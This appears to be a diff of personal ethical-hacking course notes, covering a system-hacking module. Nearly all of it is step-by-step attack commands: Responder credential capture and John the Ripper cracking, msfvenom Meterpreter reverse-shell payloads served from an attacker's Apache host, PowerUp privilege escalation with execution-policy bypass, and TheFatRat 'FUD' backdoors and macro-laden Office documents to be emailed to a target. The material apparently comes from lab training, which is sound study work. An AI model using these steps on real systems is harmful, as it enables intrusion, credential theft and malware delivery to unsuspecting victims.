@@ -241,98 +241,105 @@ Vuln Assessment scan networks for known Security weakness
 			Nessus (win) 
 			GFI LanGuard (win)
 			WebServices and Vuln Scann CGI
-			Nikto
-			
+			4 Nikto
+				root# nikto -h target -Tuning x			(-Tuning x reverse tuning used to decrease numeber of tests)
+				root# -h Cgidirs all				(Cgidirs scan all CGI diretories)
 
 Module 6 - system hacking 498
 ——————————————
-
-	•	Gaining Acess (Bypass access controls)
-		Cracking Passwd by (Dictionary or bruteforce)
-		Vuln Exploitation
-		Social Engineering
-	•	Escaling Privileges (user to Admin or user to user)
-	•	Mantaining Access (create and mantain acess) by 
-		Executing Apps with trojan spyware backdoors keyloggers
-		Hiding files with steal data by rootkits, steganography
-	•	Clear Logs
-		Covering tracks (clear logs)
-	•	LABs
-	•	1 Gain Acess
-	⁃	1 Online crack passwd with Responder	
-	⁃	on parrot: cd Responder
-	⁃	chmod +x Responder.py
-	⁃	sudo ./Responder.py -I interface
-	⁃	cd home/Responder/logs
-	John-the-ripper
-		sudo john file_name_of_log_responder.txt
-	⁃	2 Audit paswd L0phtCrack
-	⁃	on win: step by step book
-	⁃	3 find Vuln on exploit sites
-	⁃	on Win_Browser: www.exploit-db.com —> search for: cloudMe Syn 1.11.2 Buffer Overflow—> download
-	⁃	open file on notepad++
-	extra: www.securityfocus.com 
-	⁃	4 Exploit Client-Side Vuln VNC Session
-	⁃	on parrot: msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=IP attacker LPORT=444 -o /root/Desktop/Teste.exe
-	⁃	mkdir /var/www/html/share
-	⁃	chmod -R 755 /var/www/htmtl/share
-	⁃	chown -R www-data:www-data /var/www/html/share
-	⁃	copy and paste the file inside “share” folder
-	⁃	service apache2 start
-	⁃	msfconsole
-	⁃	use exploit/multi/handler
-	⁃	set payload windows/meterpreter/reverse_tcp
-	⁃	set Lhost IP_attacker
-	⁃	set Lport 444
-	⁃	Exploit or run
-	⁃	on Target Win: Browser —> IP_attacker/share
-	⁃	download the file and install
+	1 Gain Acess to the system			
+		1 Crack password with Responder						(Colect OS version, NTLM client IPs, NTLM username and Passwords)
+			root# git clone https://github.com/SpiderLabs/Responder
+			root# cd Responder
+			root# chmod +x Responder.py
+			root# sudo ./Responder.py -I interface
+			cd home/Responder/logs					(Folder stored)
+			
+			Crack passwaord with John-the-ripper
+				root# sudo snap install john-the-ripper
+				root# sudo john /location_file responder/file_name_of_log_responder.txt
+				
+	2 Audit paswd L0phtCrack (windows_Tool)
+		
+	3 find Vuln on exploit sites
+		www.exploit-db.com —> search for: cloudMe Syn 1.11.2 Buffer Overflow—> download
+		open file on notepad++
+		www.securityfocus.com 
+	
+	4 Exploit Client-Side Vuln VNC Session (exploitating weak patched windows 10)
+		
+		root# msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -f exe LHOST=IP attacker LPORT=444 -o /root/Desktop/Teste.exe
+	⁃	root# mkdir /var/www/html/share
+	⁃	root# chmod -R 755 /var/www/htmtl/share
+	⁃	root# chown -R www-data:www-data /var/www/html/share
+	⁃		copy and paste the file inside “share” folder
+	⁃	root# service apache2 start
+	⁃	oot# msfconsole
+	⁃		use exploit/multi/handler
+	⁃		set payload windows/meterpreter/reverse_tcp
+	⁃		set Lhost IP_attacker
+	⁃		set Lport 444
+			Exploit or run
 	⁃	
-	⁃	on Parrot: sysinfo.        (After meterpreter opened) —> then open New terminal
-	⁃	git clone https://github.com/PowerShellMafia/PowerSploit       to download repository from github.com
+		Browser_Target —> IP_attacker/share
+	⁃		download the file and install
 	⁃	
-	⁃	on Terminal Meterpreter: upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1  to upload the file to target
-	⁃	shell
-	⁃	powershell -ExecutionPolicy Bypass -Command “.  .\PowerUp.ps1;Invoke-AllChecks”   Quick check against win for privilege escalation
-	⁃	exit 				to  quis from ps1
-	⁃	run vnc
+	⁃	root# sysinfo.        (After meterpreter opened) —> then open New terminal
+	⁃	root# git clone https://github.com/PowerShellMafia/PowerSploit     
+	⁃	
+	⁃	Meterpreter_session: upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1  		(to upload the file to target)
+	⁃			shell
+	⁃			C:\Users\Admin\Donwload> powershell -ExecutionPolicy Bypass -Command “.  .\PowerUp.ps1;Invoke-AllChecks”         (win for privilege escalation check)
+	⁃			exit 														 (quit from ps1 check)
+	⁃			run vnc
 										
-	⁃	5 Remote Access with Armitage
-	⁃	on Parrot: service postgresql Start follow the steps on 4 task 
-	⁃	On Win:
-	⁃	6 TheFatRat M.office
-	⁃	On Parrot: git clone https://github.com/Screetsec/TheFatRat
-	⁃	chmod +x fatrat
-	⁃	chmod +x ./setup.sh
-	⁃	chmod +x ./powerfull.sh
-	⁃	./setup.sh Install take 5min ou more after complete select 2 Install searchsploit —> y
-	⁃	fatrat
-	⁃	on MENU FATRAT —> 06 (create fui backdoor 100% ….)
-	⁃	3 create exe ….
-	⁃	Set Lhost IP
-	⁃	Set Sport 4444
-	⁃	Payload
-	⁃	3
-	⁃	in details enter to finish
-	⁃	9 (Back to menu)
-	⁃	7 ( create backdoor)
-	⁃	2 (Microsoft office Macro on Win)
-	⁃	Set LHosp IP attacker
-	⁃	Set Sport 4444
-	⁃	BadDoc (name_file)
-	⁃	write something for (content of document)
-	⁃	y 
-	⁃	root/fatrat_generated/payload.exe
-	⁃	3
-	⁃	send doc via email or anyway to the target
-	⁃	open new terminal type: service apache2 Start
-	⁃	msfconsole
-	⁃	use expoli/multi/handler
-	⁃	Set payload LHOSP, LPORT
-	⁃	exploit and wait macro enable
-	⁃	7 Buffer Overflow attack 
-	⁃	steps on win and parrot
-	•LAB 2 Privilege Escalation
+	5 Remote Access with Armitage (GUI)
+		root# service postgresql start
+		Intensive scan with nmap to target
+		set payload ---> meterpreter ---> meterpreter_reverse_tcp --LPORT = 444 LHost= Attacker on output EXE ---> Save file
+		root# service apache2 start
+		left pane meterpreter_reverse_tcp
+		windows/meterpreter_reverse_tcp
+		set values ...
+		launch
+		
+		session open					(Explore needs)
+		
+		
+	6 TheFatRat M.office
+	⁃	root# git clone https://github.com/Screetsec/TheFatRat
+		root# cd TheFatRat
+	⁃	root# chmod +x fatrat
+	⁃	root# chmod +x ./setup.sh
+	⁃	root# chmod +x ./powerfull.sh
+	⁃	root# ./setup.sh 				(Install take 5min ou more after complete select 2 Install searchsploit —> y)
+	⁃	root# fatrat
+			06 					(create fud backdoor 100% with PwnWinds)
+			3 					(create exe file with apache + powershell)
+	⁃		Set Lhost IP
+	⁃		Set Sport 4444
+	⁃		Payload
+	⁃		3					(Choose payload) file save in root/Fatrat_Generated/Payload.exe
+	⁃		9 (Back to menu)
+	⁃		7 					(create backdoor office)
+	⁃		2 					(Microsoft office Macro on Win)
+	⁃		Set LHosp IP attacker
+	⁃		Set Sport 4444
+	⁃		BadDoc (name_file)
+	⁃		write something for (content of document)
+	⁃		y 
+	⁃		root/fatrat_generated/payload.exe
+	⁃		3
+	⁃		send doc via email or anyway to the target
+	⁃		open new terminal type: service apache2 Start
+	⁃		msfconsole
+	⁃			use expoli/multi/handler
+	⁃		Set payload LHOSP, LPORT
+	⁃		exploit and wait macro enable
+	7 Buffer Overflow attack 
+		steps on win and parrot
+	
+	LAB 2 Privilege Escalation
 		-		 1 Client-side esc
 				on parrot: msfvenom -p windows/meterpreter/reverse_tcp —platform windows -a x86 -e x86/shikata_ga_nai -b “x00” Lhost=IP_Attacker -f exe > Desktop/Exploit.exe
 			Note: share the file any via: Exploit.exe
